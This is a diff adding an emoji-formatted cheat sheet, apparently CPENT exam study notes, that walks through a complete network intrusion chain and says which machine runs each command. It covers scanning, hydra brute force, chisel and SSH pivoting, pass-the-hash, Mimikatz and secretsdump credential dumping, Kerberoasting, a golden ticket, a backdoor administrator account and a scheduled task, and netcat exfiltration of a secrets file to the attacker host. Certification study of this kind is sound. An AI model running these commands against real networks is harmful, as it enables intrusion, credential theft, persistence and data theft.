@@ -1,0 +1,220 @@
+🟥 Attacker Machine (Kali)
+🟧 Compromised Machine (Pivot / Victim 1)
+🟩 Target Machine (Internal / Victim 2 / DC)
+
+And for EVERY command, I’ll explicitly tell you WHERE to run it.
+
+🚀 CPENT ATTACK CHAIN (WITH EXECUTION CONTEXT)
+🔹 PHASE 1: Initial Foothold
+🟥 Run on: Attacker Machine (Kali)
+🔍 Scan Target
+
+nmap -sC -sV -p- -T4 10.10.10.5
+
+👉 Finds:
+
+Open ports
+Services
+Entry points
+🔍 Web Enumeration
+
+gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt
+
+👉 Discover hidden paths
+
+🔐 Password Attack
+
+hydra -L users.txt -P passwords.txt ssh://10.10.10.5
+
+👉 Try credentials
+
+💥 Exploitation → Get Shell
+
+(Example reverse shell triggered from exploit)
+
+🔹 PHASE 2: Stabilize Shell
+🟧 Run on: Compromised Machine (Pivot)
+🔧 Upgrade Shell
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+👉 Get interactive shell
+
+🔍 Internal Enumeration
+
+ip a
+👉 Find internal IP (e.g., 192.168.1.5)
+
+route -n
+👉 Identify internal network (e.g., 192.168.1.0/24)
+
+netstat -antp
+👉 Find internal services
+
+🔹 PHASE 3: Create Pivot Tunnel
+🔸 OPTION A: SSH Dynamic Tunnel
+🟥 Run on: Attacker (Kali)
+
+ssh -D 1080 user@10.10.10.5 -N
+
+🔍 Meaning
+Tunnel created via pivot
+SOCKS proxy at:
+
+👉 127.0.0.1:1080
+
+🔸 OPTION B: CHISEL (Recommended 🔥)
+🟥 Run on: Attacker (Kali)
+
+chisel server -p 8000 --reverse
+
+🟧 Run on: Compromised Machine
+
+chisel client 10.10.10.1:8000 R:1080:socks
+
+🎯 Result
+
+👉 SOCKS proxy created on attacker:
+
+127.0.0.1:1080
+🔹 PHASE 4: Proxychains Setup
+🟥 Run on: Attacker (Kali)
+⚙️ Configure Proxy
+
+nano /etc/proxychains.conf
+
+Add:
+
+socks5 127.0.0.1 1080
+
+🔍 Scan Internal Network
+
+proxychains nmap -sT -Pn 192.168.1.0/24
+
+⚠️ Why Here?
+Scan is executed from Kali
+Traffic routed via pivot
+🔹 PHASE 5: Internal Enumeration
+🟥 Run on: Attacker (Kali)
+🔍 SMB Scan
+
+proxychains crackmapexec smb 192.168.1.0/24
+
+🔑 Credential Check
+
+proxychains crackmapexec smb 192.168.1.10 -u user -p pass
+
+🔥 Pass-the-Hash
+
+proxychains crackmapexec smb 192.168.1.10 -u Administrator -H HASH
+
+🔹 PHASE 6: Active Directory Enumeration
+🟥 Run on: Attacker (Kali)
+🔍 BloodHound Collection
+
+proxychains bloodhound-python -d domain.local -u user -p pass -c all
+
+🔍 LDAP Enumeration
+
+proxychains ldapsearch -x -h 192.168.1.10 -D 'user@domain.local' -w pass
+
+🔹 PHASE 7: Credential Dumping
+🔸 If You Have Access to Target Machine
+🟩 Run on: Target Machine (Victim 2 / DC)
+🔥 Dump Credentials (Mimikatz)
+
+privilege::debug
+sekurlsa::logonpasswords
+
+🔸 OR Remote Dump
+🟥 Run on: Attacker (Kali)
+
+proxychains secretsdump.py domain/user:pass@192.168.1.10
+
+🔹 PHASE 8: Lateral Movement
+🟥 Run on: Attacker (Kali)
+🔥 PSEXEC
+
+proxychains psexec.py domain/user:pass@192.168.1.20
+
+🔥 WMI
+
+proxychains wmiexec.py domain/user:pass@192.168.1.20
+
+🔥 SMBEXEC
+
+proxychains smbexec.py domain/user:pass@192.168.1.20
+
+🔹 PHASE 9: Kerberos Attacks
+🟥 Run on: Attacker (Kali)
+🔥 Kerberoasting
+
+proxychains GetUserSPNs.py domain/user:pass -request
+
+🔥 AS-REP Roasting
+
+proxychains GetNPUsers.py domain.local/ -no-pass
+
+🔥 Crack Hash
+
+hashcat -m 13100 hash.txt wordlist.txt
+
+🔹 PHASE 10: Domain Admin Access
+🟥 Run on: Attacker (Kali)
+🔥 Golden Ticket
+
+ticketer.py -nthash HASH -domain domain.local -domain-sid SID Administrator
+
+🔥 Use Ticket
+
+export KRB5CCNAME=Administrator.ccache
+
+🔥 Execute
+
+psexec.py domain.local/Administrator@192.168.1.10 -k -no-pass
+
+🔹 PHASE 11: Persistence
+🟩 Run on: Domain Controller / Target
+🔥 Add User
+
+net user hacker Pass123 /add
+
+net localgroup administrators hacker /add
+
+🔥 Scheduled Task
+
+schtasks /create /sc onlogon /tn backdoor /tr shell.exe
+
+🔹 PHASE 12: Data Exfiltration
+🟩 Run on: Target Machine
+
+nc 10.10.10.1 4444 < secrets.txt
+
+🟥 Run on: Attacker
+
+nc -lvnp 4444
+
+🧠 FINAL EXECUTION MAP
+[🟥 Kali Attacker]
+   ↓ exploit
+[🟧 Pivot Machine]
+   ↓ tunnel (SSH / Chisel)
+[🟥 Kali via Proxychains]
+   ↓ scan internal
+[🟩 Internal Targets / AD]
+   ↓ creds → lateral → DA
+💡 CRITICAL CPENT MINDSET
+
+Always ask:
+
+Where am I running this command?
+Where is the traffic going?
+Am I pivoting correctly?
+⚠️ REAL EXAM FAIL POINT
+
+❌ Running internal scans on pivot directly
+✔️ Always run from Kali using proxy/tunnel
+
+🔥 FINAL GOLD RULE
+
+🧠 If you see 192.168.x.x → YOU MUST PIVOT
